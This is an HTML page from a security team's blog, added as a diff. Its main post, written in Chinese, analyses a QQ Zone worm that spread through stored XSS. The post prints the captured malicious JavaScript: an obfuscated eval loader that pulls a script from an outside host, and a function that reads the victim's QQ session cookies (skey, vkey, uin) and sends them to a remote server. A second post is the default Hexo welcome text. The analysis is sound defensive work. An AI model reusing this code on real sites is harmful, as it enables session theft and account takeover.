@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Asuri Team">
+<meta property="og:url" content="http://asuri.org/author/rexskz/page/2/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:locale">
+<meta property="article:author" content="All Members">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-qzone-xss-analysis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/08/15/qzone-xss-analysis/" class="article-date">
+  <time datetime="2015-08-15T06:12:00.000Z" itemprop="datePublished">2015-08-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/08/15/qzone-xss-analysis/">对QQ空间自动转发/加好友的研究</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前几天，QQ 空间的一大批好友转了所谓“优衣库”的一个视频，不用说，肯定是QQ空间有什么XSS漏洞了。有学弟让我去研究，其实我是拒绝的，因为我当时在搞别的事情，随便看了看源码没发现问题，于是就放到脑后了。</p>
+<p>昨天晚上发现空间里又有好友转发的现象，甚至有自动加好友的问题。正好大半夜一个人有安静的时间，于是就顺便研究一下。</p>
+<p>一开始没有头绪，在想是不是QQ空间有直接的XSS漏洞，于是看到了分享链接的标题，“▶↔§↙♯敱”这几个字很可疑，但是经过<code>encodeURIComponent</code>之后发现并没什么异常，这条路走不通。</p>
+<p>从隐身窗口中打开链接（链接地址是恶意网址这个很容易看出来），但是并没看出代码有什么问题，除了页面最下方有一个<code>loadscript.js</code>，看名字应该是加载一个JavaScript代码，但是网址却是一个<code>.php</code>结尾的网址。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dor = <span class="built_in">parseInt</span>(cookieRead(<span class="string">&quot;sdone&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (dor &amp;&amp; dor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loadscript.js(<span class="string">&quot;/v/getplay.php&quot;</span>);</span><br><span class="line">    cookie_set(<span class="string">&quot;sdone&quot;</span>, <span class="number">99</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是好像并没有什么端倪：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rndNum</span>(<span class="params">len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &amp;&amp; len &gt; <span class="number">0</span> &amp;&amp; len &lt; <span class="number">100</span>) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        len = <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> strs = <span class="string">&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> maxPos = strs.length;</span><br><span class="line">    <span class="keyword">var</span> rdstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        rdstr += strs.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rdstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cookieRead) &#123;</span><br><span class="line">    <span class="keyword">var</span> dor = cookieRead(<span class="string">&quot;adplay&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dor &amp;&amp; dor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cookie_set(<span class="string">&quot;adplay&quot;</span>, <span class="number">99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这条路也走不通。为了重现这个问题，我决定亲自实验一下。于是我在普通Chrome窗口中点开了这个链接。</p>
+<p><strong>然并卵。</strong></p>
+<p>什么都没发生，所以这肯定是只在手机QQ的浏览器中才有用。手头没有手机上的抓包工具，不过还好以前写前端的时候，为了方便测试移动端兼容性特地写了个页面：<a title="设备信息检测" href="https://www.rexskz.info/demos/devicetest.html" target="_blank">设备信息检测</a>，于是用手机访问了一下，我的手机QQ浏览器的UA是这样的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; HUAWEI G7-TL00 Build/HuaweiG7-TL00) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025442 Mobile Safari/533.1 V1_AND_SQ_5.7.2_260_YYB_D QQ/5.7.2.2490 NetType/4G WebP/0.3.0</span><br></pre></td></tr></table></figure>
+
+<p>在Chrome的开发者工具中将UA修改成这个，然而发现我已经上不去那个网站了。</p>
+<p>天无绝人之路。将其一键加入科学上网列表之后，发现那个<code>getplay.php</code>的请求没了……</p>
+<p>可能是人家防止我们分析吧。没关系，把网址中的随机参数改一改，清空一下缓存啥的，于是这个神奇的文件又出现了：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;footad&quot;</span>).src = <span class="string">&quot;http://blog.qq.com/qzone/1107397297/1407071241.htm?vid=&quot;</span> + <span class="built_in">window</span>.vid;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rndNum</span>(<span class="params">len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &amp;&amp; len &gt; <span class="number">0</span> &amp;&amp; len &lt; <span class="number">100</span>) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        len = <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> strs = <span class="string">&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> maxPos = strs.length;</span><br><span class="line">    <span class="keyword">var</span> rdstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        rdstr += strs.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rdstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cookieRead) &#123;</span><br><span class="line">    <span class="keyword">var</span> dor = cookieRead(<span class="string">&quot;adplay&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dor &amp;&amp; dor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cookie_set(<span class="string">&quot;adplay&quot;</span>, <span class="number">99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一行……在干啥？</p>
+<p>实在是太晚了，于是我先睡觉了，睡得特别好，今天12点才起床。</p>
+<p>于是打开网址看看吧（从<code>console</code>中获取到<code>window.vid=19</code>），发现了下面这么一段：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="regexp">/e%3Ddocument.body.innerHTML%3Bs%3De.indexOf%28%22%2f%2f%27%2C%27pro%22%29%3Bif%28s%3E0%29%7Be%3De.substring%28s%2B2%29%3Bt%3De.indexOf%28%22%3C%5C%2F%22%29%3Bif%28t%3E0%29%7Be%3D%22g_weather%5B%27save%27%5D%3D%7B%27country%27%3A%27%E4%B8%AD%E5%9B%BD%22%2Be.substring%280%2Ct%29%3Beval%28e%29%7D%7D%3Bdocument.write(%27%3Cscr%69pt%20src%3D%22h%74%74p%3A%2f%2fimgc%61che.qq.skyd%61t%61s.com%2Fg%2Fn%2Fb.jpg%22%3E%3C%2Fscr%69pt%3E%27)/</span>;</span><br><span class="line">s = <span class="built_in">unescape</span>(s);</span><br><span class="line"><span class="built_in">eval</span>(s.substring(<span class="number">1</span>, s.length - <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><code>eval</code>执行的语句，也就是那个<code>s</code>里面的内容，是这样的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="built_in">document</span>.body.innerHTML;</span><br><span class="line">s = e.indexOf(<span class="string">&quot;//&#x27;, &#x27;pro&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    e = e.substring(s + <span class="number">2</span>);</span><br><span class="line">    t = e.indexOf(<span class="string">&quot;&lt;\/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        e = <span class="string">&quot;g_weather[&#x27;save&#x27;]=&#123;&#x27;country&#x27;:&#x27;ä¸­å½&quot;</span> + e.substring(<span class="number">0</span>, t);</span><br><span class="line">        <span class="built_in">eval</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;&lt;strong&gt;http://imgcache.qq.skydatas.com/g/n/b.jpg&lt;/strong&gt;&quot;&gt;&lt;/script&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可见这是加载了一个奇怪的资源：<code>.jpg</code>结尾的JavaScript代码。打开之后有个301跳转，追随过去看看吧。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tjskey</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> eimg;</span><br><span class="line">    eimg = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    eimg.type = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> myskey = cookieRead(<span class="string">&quot;skey&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> myqq = <span class="built_in">parseInt</span>(cookieRead(<span class="string">&quot;uin&quot;</span>).replace(<span class="string">&quot;o&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">var</span> vkey = cookieRead(<span class="string">&quot;vkey&quot;</span>);</span><br><span class="line">    <span class="comment">//if(myqq&gt;500 &amp;&amp; vkey.length&gt;10)&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (myqq &gt; <span class="number">99999999</span>) &#123;</span><br><span class="line">        eimg.src = <span class="string">&quot;http://db.outome.com/nsys/tsk.php?u=&quot;</span> + myqq + <span class="string">&quot;&amp;s=&quot;</span> + myskey + <span class="string">&quot;&amp;v=&quot;</span> + vkey + <span class="string">&quot;&amp;f=&quot;</span> + getQueryString(<span class="string">&quot;vid&quot;</span>);</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(eimg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到上面加粗的那一段了？通过<code>http://db.outome.com/nsys/tsk.php</code>这个接口将你的qq、skey、vkey、vid信息发到指定的位置。</p>
+<p>还需要管别的么？有了key以后想做什么操作都随意了吧！</p>
+<p>但是这并没有解决根本的疑问：blog.qq.com的网页上为什么会出现外面的代码？blog.qq.com我从来没听说过，看起来像QQ空间的前身，那为什么QQ没有弃用这个域名？是不是这个网站上有BUG？我就不得而知了。如果有大神有新的研究成果，求共享！</p>
+<p>另，分享一篇寻找资料时找到的文章：<a title="qq空间某被利用的xss分析 - virusdefender's blog" href="https://virusdefender.net/index.php/archives/347/" target="_blank">qq空间某被利用的xss分析 - virusdefender’s blog</a>，与本文的原理不同，这个是通过XSS修改<code>&lt;base&gt;</code>直接获取key以达到目标。但是该文章是通过网址中的<code>imgdm</code>参数进行反射型XSS，而本文应该属于存储型XSS。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2015/08/15/qzone-xss-analysis/" data-id="clg6iymph001bguot8amxbq8s" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/1969/12/31/hello-world/" class="article-date">
+  <time datetime="1969-12-31T16:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/1969/12/31/hello-world/">Hello World</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<p>Thanks to the plugin <code>hexo-multiauthor</code>, we can support more than one author now!</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/1969/12/31/hello-world/" data-id="clg6iymp9000qguot2x945kxi" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    <a class="extend prev" rel="prev" href="/author/rexskz/">&amp;laquo; __(&#39;prev&#39;)</a><a class="page-number" href="/author/rexskz/">1</a><span class="page-number current">2</span>
+  </nav>
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
